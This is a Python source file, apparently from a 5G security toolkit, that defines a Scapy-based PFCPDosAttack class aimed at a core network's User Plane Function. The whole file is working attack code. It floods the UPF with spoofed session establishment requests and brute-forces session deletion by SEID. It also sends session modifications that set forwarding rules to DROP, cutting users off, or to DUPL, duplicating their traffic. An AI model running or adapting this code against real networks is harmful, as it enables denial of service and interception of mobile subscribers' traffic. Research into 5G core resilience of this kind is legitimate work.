from src.utils.protocols.pfcp import PFCPToolkit
import random, time, threading, ipaddress
from scapy.all import send, sr1, IP

from scapy.contrib.pfcp import *
from src.pfcpToolkit.utils.logger import Log
from src.pfcpToolkit.utils.handleParams import HandleParams


# ---------------------------------------------------------------------------- #
#                                 PFCPDosAttack                                #
# ---------------------------------------------------------------------------- #
class PFCPDosAttack:
    """
    Performs PFCP-based Denial of Service (DoS) attacks against a target UPF.

    This class provides functionalities to automate the sending of PFCP session establishment,
    deletion, and modification requests in order to flood or brute-force a 5G core network component (UPF).

    Attributes:
        evil_addr (str): Source IP address used to send PFCP messages (attacker IP).
        upf_addr (str): Destination IP address of the target UPF.
        src_port (int): UDP source port for PFCP messages.
        dest_port (int): UDP destination port for PFCP messages (default PFCP port 8805).
        interface (str): Network interface used for sending packets (e.g., "eth0").
        ue_base_addr (IPv4Address): Starting IP address for generating UE IP addresses.
        verbose (bool): Enable verbose logging.
        prepare (bool): Prepare packets in memory before sending to improve speed.
        randomize (bool): Enable randomization of sequence numbers, TEID, SEID, UE addresses.
        random_far_number (int): Number of random FARs to attach to session establishment.
        smf_addr (str, optional): Address of the SMF for targeted deletion attacks.
    """

    def __init__(
        self,
        evil_addr=None,
        upf_addr=None,
        src_port=None,
        dest_port=None,
        interface="eth0",
        ue_start_addr="1.1.1.1",
        verbose=False,
        prepare=False,
        randomize=False,
        random_far_number=15,
        smf_addr=None,
    ):
        self.evil_addr = evil_addr
        self.upf_addr = upf_addr
        self.src_port = src_port
        self.dest_port = dest_port
        self.seq = 1
        self.seid_counter = 1
        self.teid_counter = 1
        self.ue_base_addr = ipaddress.IPv4Address(ue_start_addr)
        self._ue_counter = 1
        self.pfcp_association_packet = None
        self.pfcp_establishment_packet_list = []
        self.verbose = verbose
        self.prepare = prepare
        self.randomize = randomize
        self.lock = threading.Lock()
        self.random_far_number = random_far_number

        self.smf_addr = smf_addr
        self.SESSION_CONTEXT_NOT_FOUND = 65
        self.REQUEST_ACCEPTED = 1
        self.valid_seid_list = list()

        self.evil_addr, self.upf_addr, self.src_port, self.dest_port

        self.interface = interface

    # ------------------- Methods to Modify Instance Parameters ------------------ #
    def set_interface(self, interface):
        """
        Set the network interface used to send PFCP packets.

        Args:
            interface (str): Name of the network interface (e.g., "eth0", "ens33").

        Returns:
            None
        """

        self.interface = interface
        if not self.verbose:
            return
        if interface:
            print(f"Interface set to {interface}")

    def set_random_far_number(self, random_far_number=15):
        """
        Set the number of random FARs to be generated for each PFCP session establishment.

        Args:
            random_far_number (int): Number of random Forwarding Action Rules to generate. Defaults to 15.

        Returns:
            None
        """

        self.random_far_number = random_far_number
        if not self.verbose:
            return
        if random_far_number:
            print(f"Random FAR number set to {random_far_number}")

    def set_randomize(self, randomize=True):
        """
        Enable or disable randomization mode for SEID, TEID, UE IP addresses, and sequence numbers.

        Args:
            randomize (bool, optional): True to enable randomization, False to disable. Defaults to True.

        Returns:
            None
        """

        self.randomize = randomize
        if not self.verbose:
            return
        if randomize:
            print("Randomize mode enabled")

        else:
            print("Randomize mode disabled")

    def set_prepare(self, prepare=True):
        """
        Enable or disable preparation mode for PFCP session establishment packets.

        Args:
            prepare (bool, optional): True to enable preparation of packets before sending. Defaults to True.

        Returns:
            None
        """

        self.prepare = prepare
        if not self.verbose:
            return
        if prepare:
            print("Prepare mode enabled")

        else:
            print("Prepare mode disabled")

    def set_verbose(self, verbose=True):
        """
        Enable or disable verbose mode for logging.

        Args:
            verbose (bool, optional): True to enable detailed logs, False to disable. Defaults to True.

        Returns:
            None
        """

        self.verbose = verbose
        if verbose:
            print("Verbose mode enabled")

        else:
            print("Verbose mode disabled")

    # ------------------ Identifier / Address Generation Methods ----------------- #
    def new_ue_addr(self, randomize=False):
        """
        Generate a new UE (User Equipment) IPv4 address.

        Args:
            randomize (bool, optional): If True, generates a completely random IP address.
                If False, increments from the base UE IP address. Defaults to False.

        Returns:
            str: The generated UE IPv4 address as a string.
        """

        if self.randomize or randomize:
            return f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

        next_ip = self.ue_base_addr + self._ue_counter
        self._ue_counter += 1
        return str(next_ip)

    def new_seq(self, randomize=False):
        """
        Generate a new PFCP sequence number.

        Args:
            randomize (bool, optional): If True, generates a completely random sequence number.
                If False, increments sequentially with thread safety. Defaults to False.

        Returns:
            int: The generated sequence number.
        """

        if self.randomize or randomize:
            seqNbr = random.randint(1, 0xFFFFFFFF)
            return seqNbr

        with self.lock:
            seq = self.seq
            self.seq += 1
            if self.seq > 0xFFFFFFFF:
                self.seq = 1
            return seq

    def new_seid(self, randomize=False):
        """
        Generate a new SEID (Session Endpoint Identifier).

        Args:
            randomize (bool, optional): If True, generates a completely random SEID.
                If False, increments sequentially. Defaults to False.

        Returns:
            int: The generated SEID.
        """

        if self.randomize or randomize:
            self.seid = random.randint(1, 0xFFFFFFFFFFFFFFFF)
            return self.seid

        seid = self.seid_counter
        self.seid_counter += 1
        if self.seid_counter > 0xFFFFFFFFFFFFFFFF:
            self.seid_counter = 1
        return seid

    def new_teid(self, randomize=False):
        """
        Generate a new TEID (Tunnel Endpoint Identifier).

        Args:
            randomize (bool, optional): If True, generates a completely random TEID.
                If False, increments sequentially. Defaults to False.

        Returns:
            int: The generated TEID.
        """

        if self.randomize or randomize:
            self.teid = random.randint(1, 0xFFFFFFFF)
            return self.teid

        teid = self.teid_counter
        self.teid_counter += 1
        if self.teid_counter > 0xFFFFFFFF:
            self.teid_counter = 1
        return teid

    # -------------------------- Thread Worker Functions ------------------------- #
    def _pfcp_session_establishment_flood_worker(
        self,
        count,
        evil_addr,
        upf_addr,
        src_port=8805,
        dest_port=8805,
        verbose=True,
        start_index=0,
        infinite=False,
    ):
        """
        Worker function to send PFCP Session Establishment Requests.

        If prepare mode is enabled, sends pre-built packets from memory.
        Otherwise, dynamically builds and sends new PFCP Session Establishment packets.

        Args:
            count (int): Number of PFCP requests to send.
            start_index (int, optional): Starting index in the prepared packet list if in prepare mode. Defaults to 0.

        Returns:
            None
        """

        worker_logger = Log(f"[DoS][Worker-{start_index}]")

        if self.prepare:
            if self.verbose:
                print(
                    f"Worker starts flooding with {count} requests (offset {start_index})"
                )

        else:
            print(
                f"Worker starts flooding with {count} requests (offset {start_index})"
            )

        # if self.prepare:
        #     for i in range(start_index, start_index + count):
        #         try:
        #             send(self.pfcp_establishment_packet_list[i])
        #         except Exception as e:
        #             print(
        #                 f"Error sending PFCP session establishment packet: {e}"
        #             )


        if infinite:
            while True:
                try:
                    seq = self.new_seq(randomize=True)
                    seid = self.new_seid(randomize=True)
                    teid = self.new_teid(randomize=True)
                    ue_addr = self.new_ue_addr()
                    ie_nodeid = Raw(bytes(IE_NodeId(id_type=0, ipv4=evil_addr)))
                    ie_fseid = Raw(bytes(IE_FSEID(seid=seid, v4=1, ipv4=evil_addr)))
                    random_far_number = self.random_far_number

                    ie_createpdr = Raw(
                        bytes(
                            IE_CreatePDR(
                                IE_list=[
                                    IE_PDR_Id(id=1),
                                    IE_Precedence(precedence=255),
                                    IE_PDI(
                                        IE_list=[
                                            IE_SourceInterface(interface=1),
                                            IE_FTEID(TEID=teid, V4=1, ipv4=ue_addr),
                                        ]
                                    ),
                                    IE_FAR_Id(id=1),
                                ]
                            )
                        )
                    )

                    ie_createfar = Raw(
                        bytes(
                            IE_CreateFAR(
                                IE_list=[
                                    IE_FAR_Id(id=1),
                                    IE_ApplyAction(FORW=1),
                                    IE_OuterHeaderCreation(
                                        GTPUUDPIPV4=1,
                                        TEID=teid,
                                        ipv4=ue_addr,
                                        port=2152,
                                    ),
                                ]
                            )
                        )
                    )

                    pfcp_msg = (
                        PFCP(version=1, message_type=50, seid=0, S=1, seq=seq)
                        / ie_nodeid
                        / ie_fseid
                        / ie_createpdr
                        / ie_createfar
                    )

                    if random_far_number:
                        for i in range(random_far_number):
                            pfcp_msg = pfcp_msg / Raw(
                                bytes(
                                    IE_CreateFAR(
                                        IE_list=[
                                            IE_FAR_Id(id=random.randint(1, 255)),
                                            IE_ApplyAction(FORW=1),
                                            IE_OuterHeaderCreation(
                                                GTPUUDPIPV4=1,
                                                TEID=random.randint(1, 0xFFFFFFFF),
                                                ipv4=".".join(
                                                    str(random.randint(1, 254))
                                                    for _ in range(4)
                                                ),
                                                port=2152,
                                            ),
                                        ]
                                    )
                                )
                            )

                    pkt = (
                        IP(src=evil_addr, dst=upf_addr)
                        / UDP(sport=src_port, dport=dest_port)
                        / pfcp_msg
                    )
                    pkt = pkt.__class__(bytes(pkt))  # Recalcul final
                    send(pkt)
                except Exception as e:
                    print(f"Error sending PFCP session establishment request: {e}")
            if self.verbose:
                print(f"Worker finished flooding with {count} requests")

            return

        for i in range(count):
            try:

                seq = self.new_seq(randomize=True)
                seid = self.new_seid(randomize=True)
                teid = self.new_teid(randomize=True)
                ue_addr = self.new_ue_addr()
                ie_nodeid = Raw(bytes(IE_NodeId(id_type=0, ipv4=evil_addr)))
                ie_fseid = Raw(bytes(IE_FSEID(seid=seid, v4=1, ipv4=evil_addr)))
                random_far_number = self.random_far_number

                ie_createpdr = Raw(
                    bytes(
                        IE_CreatePDR(
                            IE_list=[
                                IE_PDR_Id(id=1),
                                IE_Precedence(precedence=255),
                                IE_PDI(
                                    IE_list=[
                                        IE_SourceInterface(interface=1),
                                        IE_FTEID(TEID=teid, V4=1, ipv4=ue_addr),
                                    ]
                                ),
                                IE_FAR_Id(id=1),
                            ]
                        )
                    )
                )

                ie_createfar = Raw(
                    bytes(
                        IE_CreateFAR(
                            IE_list=[
                                IE_FAR_Id(id=1),
                                IE_ApplyAction(FORW=1),
                                IE_OuterHeaderCreation(
                                    GTPUUDPIPV4=1,
                                    TEID=teid,
                                    ipv4=ue_addr,
                                    port=2152,
                                ),
                            ]
                        )
                    )
                )

                pfcp_msg = (
                    PFCP(version=1, message_type=50, seid=0, S=1, seq=seq)
                    / ie_nodeid
                    / ie_fseid
                    / ie_createpdr
                    / ie_createfar
                )

                if random_far_number:
                    for i in range(random_far_number):
                        pfcp_msg = pfcp_msg / Raw(
                            bytes(
                                IE_CreateFAR(
                                    IE_list=[
                                        IE_FAR_Id(id=random.randint(1, 255)),
                                        IE_ApplyAction(FORW=1),
                                        IE_OuterHeaderCreation(
                                            GTPUUDPIPV4=1,
                                            TEID=random.randint(1, 0xFFFFFFFF),
                                            ipv4=".".join(
                                                str(random.randint(1, 254))
                                                for _ in range(4)
                                            ),
                                            port=2152,
                                        ),
                                    ]
                                )
                            )
                        )

                pkt = (
                    IP(src=evil_addr, dst=upf_addr)
                    / UDP(sport=src_port, dport=dest_port)
                    / pfcp_msg
                )
                pkt = pkt.__class__(bytes(pkt))  # Recalcul final
                send(pkt)
            except Exception as e:
                print(f"Error sending PFCP session establishment request: {e}")

        if self.verbose:
            print(f"Worker finished flooding with {count} requests")

    def _pfcp_session_deletion_bruteforce_worker(
        self,
        count,
        evil_addr,
        upf_addr,
        src_port=8805,
        dest_port=8805,
        verbose=True,
        start_index=0,
        infinite=False,
    ):
        """
        Worker function to brute-force PFCP Session Deletion Requests.

        Sends PFCP Session Deletion Requests across a range of SEIDs,
        attempting to find valid active sessions.

        Args:
            count (int): Number of SEIDs to try.
            start_index (int, optional): Starting SEID offset. Defaults to 0.

        Returns:
            None
        """
        REQUEST_ACCEPTED = 0x1

        worker_logger = Log(f"[DoS][Worker-{start_index}]")
        if verbose:
            print(
                f"Worker starts flooding with {count} requests (offset {start_index})"
            )

        if infinite:
            while True:
                try:
                    seid = self.new_seid(randomize=True)
                    random_seq = self.new_seq(randomize=True)
                    node_id = Raw(bytes(IE_NodeId(id_type=0, ipv4=evil_addr)))

                    pfcp_msg = (
                        PFCP(
                            version=1,
                            message_type=54,
                            seid=seid,
                            S=1,
                            seq=self.new_seq(randomize=random_seq),
                        )
                        / node_id
                    )
                    packet = (
                        IP(src=evil_addr, dst=upf_addr)
                        / UDP(sport=src_port, dport=dest_port)
                        / pfcp_msg
                    )
                    packet = packet.__class__(bytes(packet))
                    response = sr1(packet)

                    if response == REQUEST_ACCEPTED:
                        print(
                            f"PFCP session deletion request accepted; SEID: {hex(self.seid_counter)}"
                        )
                        self.valid_seid_list.append(self.seid_counter)

                except Exception as e:
                    print(f"Error sending PFCP session deletion request: {e}")
            if verbose:
                print(f"Worker finished flooding with {count} requests")
            return

        for i in range(start_index, start_index + count):
            try:
                seid = i +1
                random_seq = self.new_seq(randomize=True)
                node_id = Raw(bytes(IE_NodeId(id_type=0, ipv4=evil_addr)))

                pfcp_msg = (
                    PFCP(
                        version=1,
                        message_type=54,
                        seid=seid,
                        S=1,
                        seq=self.new_seq(randomize=random_seq),
                    )
                    / node_id
                )
                packet = (
                    IP(src=evil_addr, dst=upf_addr)
                    / UDP(sport=src_port, dport=dest_port)
                    / pfcp_msg
                )
                packet = packet.__class__(bytes(packet))
                response = sr1(packet)

                if response == REQUEST_ACCEPTED:
                    print(
                        f"PFCP session deletion request accepted; SEID: {hex(self.seid_counter)}"
                    )
                    self.valid_seid_list.append(self.seid_counter)


                # response = pfcp_obj.Send_PFCP_session_deletion_req(
                #     seid=i + 1, random_seq=True
                # )

                # if response == REQUEST_ACCEPTED:
                #     print(f"PFCP session deletion request accepted; SEID: {hex(i+1)}")

                #     self.valid_seid_list.append(i + 1)

            except Exception as e:
                print(f"Error sending PFCP session deletion request: {e}")

    # --------------------------- Start Attacks Methods -------------------------- #
    def start_pfcp_session_deletion_bruteforce(
        self,
        evil_addr,
        upf_addr,
        reqNbr=100,
        num_threads=1,
        src_port=8805,
        dest_port=8805,
        verbose=True,
        infinite=False,
    ):
        """
        Launch a multithreaded brute-force attack by sending PFCP Session Deletion Requests.

        Divides the total number of requests across multiple threads
        and attempts to discover active sessions based on SEID responses.

        Args:
            reqNbr (int, optional): Total number of PFCP deletion requests to send. Defaults to 100.
            num_threads (int, optional): Number of threads to use for concurrent sending. Defaults to 1.

        Returns:
            None
        """

        if verbose:
            print(
                f"Starting PFCP session deletion bruteforce with {reqNbr} requests and {num_threads} threads"
            )

        threads = []
        per_thread = reqNbr // num_threads
        remaining = reqNbr % num_threads
        
        thread_offset = 0
        start_time = time.time()
        for i in range(num_threads):
            count = per_thread + (1 if i < remaining else 0)
            t = threading.Thread(
                target=self._pfcp_session_deletion_bruteforce_worker,
                args=(
                    count,
                    evil_addr,
                    upf_addr,
                    src_port,
                    dest_port,
                    verbose,
                    thread_offset,
                    infinite,
                ),
            )
            t.start()
            threads.append(t)
            thread_offset += count

        for t in threads:
            t.join()
        if self.verbose:
            print(f"PFCP session deletion bruteforce completed")

        end_time = time.time()
        duration = end_time - start_time
        pps = reqNbr / duration if duration > 0 else float("inf")
        print(f"Sent {reqNbr} packets in {duration:.2f} seconds ({pps:.2f} pps)")
        print(
            f"{len(self.valid_seid_list)} valid SEIDs found ({len(self.valid_seid_list) / reqNbr * 100:.2f}%)"
        )

    def start_pfcp_session_establishment_flood(
        self,
        evil_addr,
        upf_addr,
        reqNbr=100,
        prepare=False,
        num_threads=1,
        random_far_number=0,
        src_port=8805,
        dest_port=8805,
        verbose=True,
        infinite=False,
    ):
        """
        Launch a multithreaded PFCP Session Establishment flood attack.

        Optionally prepares the PFCP session establishment packets in advance,
        then sends them over multiple threads to maximize throughput.

        Args:
            reqNbr (int, optional): Total number of PFCP session establishment requests to send. Defaults to 100.
            num_threads (int, optional): Number of concurrent threads to use for sending. Defaults to 1.

        Returns:
            None
        """

        # if prepare:
        #     self._prepare_pfcp_session_establishment_flood(
        #         reqNbr,
        #         evil_addr=evil_addr,
        #         upf_addr=upf_addr,
        #         random_far_number=random_far_number,
        #         src_port=src_port,
        #         dest_port=dest_port,
        #         verbose=verbose,
        #     )

        if verbose:
            print(
                f"Starting PFCP session establishment flood with {reqNbr} requests and {num_threads} threads"
            )

        threads = []
        per_thread = reqNbr // num_threads
        remaining = reqNbr % num_threads

        seq = self.new_seq()

        # Trick to bypass scapy's bad parsing
        node_id = Raw(bytes(IE_NodeId(id_type=0, ipv4=evil_addr)))
        recovery_timestamp = Raw(
            bytes(IE_RecoveryTimeStamp(timestamp=int(time.time())))
        )
        pfcp_msg = (
            PFCP(version=1, message_type=5, seid=0, S=0, seq=seq)
            / node_id
            / recovery_timestamp
        )

        packet = (
            IP(src=evil_addr, dst=upf_addr)
            / UDP(sport=src_port, dport=dest_port)
            / pfcp_msg
        )
        packet = packet.__class__(bytes(packet))

        pfcp_association_packet = packet

        start_time = time.time()

        try:
            send(pfcp_association_packet)
        except Exception as e:
            print(f"Error sending PFCP association packet: {e}")

        thread_offset = 0
        for i in range(num_threads):
            count = per_thread + (1 if i < remaining else 0)
            t = threading.Thread(
                target=self._pfcp_session_establishment_flood_worker,
                args=(
                    count,
                    evil_addr,
                    upf_addr,
                    src_port,
                    dest_port,
                    verbose,
                    thread_offset + 1,
                    infinite,
                ),
            )
            t.start()
            threads.append(t)
            thread_offset += count

        for t in threads:
            t.join()
        end_time = time.time()

        if verbose:
            print(f"PFCP session establishment flood completed")

        duration = end_time - start_time
        pps = reqNbr / duration if duration > 0 else float("inf")
        print(f"Sent {reqNbr} packets in {duration:.2f} seconds ({pps:.2f} pps)")

    def start_pfcp_session_deletion_targeted(
        self,
        target_seid,
        evil_addr,
        upf_addr,
        src_port=8805,
        dest_port=8805,
        verbose=True,
    ):
        """
        Send a targeted PFCP Session Deletion Request to a specific UPF.

        Constructs and sends a deletion request for a specified SEID,
        optionally overriding the source (SMF) and destination (UPF) addresses and ports.

        Args:
            target_seid (int): SEID of the session to delete.
            evil_addr (str, optional): Source IPv4 address (SMF). Defaults to instance's smf_addr.
            upf_addr (str, optional): Destination IPv4 address (UPF). Defaults to instance's upf_addr.
            src_port (int, optional): UDP source port. Defaults to instance's src_port.
            dest_port (int, optional): UDP destination port. Defaults to instance's dest_port.

        Returns:
            None
        """

        if verbose:
            print(
                f"Sending PFCP session deletion packet to {upf_addr} with SEID {target_seid}"
            )




        seq = self.new_seq()

    

        node_id = Raw(bytes(IE_NodeId(id_type=0, ipv4=evil_addr)))

        pfcp_msg = (
            PFCP(
                version=1,
                message_type=54,
                seid=target_seid,
                S=1,
                seq=self.new_seq(randomize=True),
            )
            / node_id
        )
        packet = (
            IP(src=evil_addr, dst=upf_addr)
            / UDP(sport=src_port, dport=dest_port)
            / pfcp_msg
        )
        req = packet.__class__(bytes(packet))

        # req = self.Build_PFCP_session_deletion_req(
        #     seid=target_seid,
        #     src_addr=evil_addr,
        #     dest_addr=upf_addr,
        #     src_port=src_port,
        #     dest_port=dest_port,
        #     random_seq=True,
        # )

        res = sr1(req)
        if not res:
            self.logger.error("No response received for PFCP session deletion request")

        pfcp_cause = None

        for ie in res[PFCP].IE_list:
            if isinstance(ie, IE_Cause):
                pfcp_cause = ie.cause
                break

        print(
            f"PFCP Session Deletion response received with cause: {pfcp_cause}"
        )
        # PFCPToolkit_obj = PFCPToolkit(
        #     src_addr=evil_addr,
        #     dest_addr=upf_addr,
        #     src_port=src_port,
        #     dest_port=dest_port,
        # )

        # PFCPToolkit_obj.Send_PFCP_session_deletion_req(seid=target_seid)

        
        print(
            f"PFCP session deletion packet sent to {upf_addr} with SEID {target_seid}"
        )

    def start_pfcp_session_modification_far_drop_bruteforce(
        self,
        far_range,
        session_range,
        evil_addr,
        upf_addr,
        src_port=8805,
        dest_port=8805,
        verbose=True,
    ):
        """
        Launch a brute-force attack by sending PFCP Session Modification Requests targeting FARs.

        Iterates over a range of SEIDs and FAR IDs, attempting to modify forwarding actions
        and checking for successful responses from the UPF.

        Args:
            far_range (int): Number of FAR IDs to try for each SEID.
            session_range (int): Number of SEIDs (sessions) to target.
            evil_addr (str, optional): Source IPv4 address for the PFCP messages. Defaults to instance's evil_addr.
            upf_addr (str, optional): Destination IPv4 address (UPF). Defaults to instance's upf_addr.
            src_port (int, optional): UDP source port. Defaults to instance's src_port.
            dest_port (int, optional): UDP destination port. Defaults to instance's dest_port.

        Returns:
            None
        """

        PFCPToolkit_obj = PFCPToolkit(
            src_addr=evil_addr,
            dest_addr=upf_addr,
            src_port=src_port,
            dest_port=dest_port,
        )

        print("Starting PFCP Session modification far drop bruteforce")
        for seid in range(1, session_range):

            for farId in range(1, far_range):
                apply_action = ["DROP"]


                packet = PFCPToolkit_obj.Build_PFCP_session_modification_req(
                    seid=seid, far_id=farId, apply_action=["DROP"]
                )
                res = sr1(packet)
                pfcp_cause = None
                for ie in res[PFCP].IE_list:
                    if isinstance(ie, IE_Cause):
                        pfcp_cause = ie.cause
                        break

                if pfcp_cause == 1:
                    print(
                        f"PFCP Session Modification Request accepted, SEID: {hex(seid)}, FAR_ID: {hex(farId)}"
                    )
        print("PFCP Session modification far drop bruteforce finished")

    # TODO: In PFCPToolkit, to edit dupl parameters, might need to use "UpdateDuplicatingParameters" IE instead of "DuplicatingParameters"
    def start_pfcp_session_modification_far_dupl_bruteforce(
        self,
        far_range,
        session_range,
        evil_addr,
        upf_addr,
        src_port=8805,
        dest_port=8805,
    ):
        """
        Launch a brute-force attack by sending PFCP Session Modification Requests targeting FARs.

        Iterates over a range of SEIDs and FAR IDs, attempting to modify forwarding actions
        and checking for successful responses from the UPF.

        Args:
            far_range (int): Number of FAR IDs to try for each SEID.
            session_range (int): Number of SEIDs (sessions) to target.
            evil_addr (str, optional): Source IPv4 address for the PFCP messages. Defaults to instance's evil_addr.
            upf_addr (str, optional): Destination IPv4 address (UPF). Defaults to instance's upf_addr.
            src_port (int, optional): UDP source port. Defaults to instance's src_port.
            dest_port (int, optional): UDP destination port. Defaults to instance's dest_port.

        Returns:
            None
        """

        PFCPToolkit_obj = PFCPToolkit(
            src_addr=evil_addr,
            dest_addr=upf_addr,
            src_port=src_port,
            dest_port=dest_port,
        )
        for seid in range(1, session_range):

            for farId in range(1, far_range):
                ############## DONE: Add duplicate parameters + outer header creation, we need to create a new tunnel to send duplicated packets
                # TODO: HERE
                packet = PFCPToolkit_obj.Build_PFCP_session_modification_req(
                    seid=seid, far_id=farId, apply_action=["FORW", "DUPL"]
                )
                res = sr1(packet)
                pfcp_cause = None
                for ie in res[PFCP].IE_list:
                    if isinstance(ie, IE_Cause):
                        pfcp_cause = ie.cause
                        break

                if pfcp_cause == 1:
                    print(
                        f"PFCP Session Modification Request accepted, SEID: {hex(seid)}, FAR_ID: {hex(farId)}"
                    )
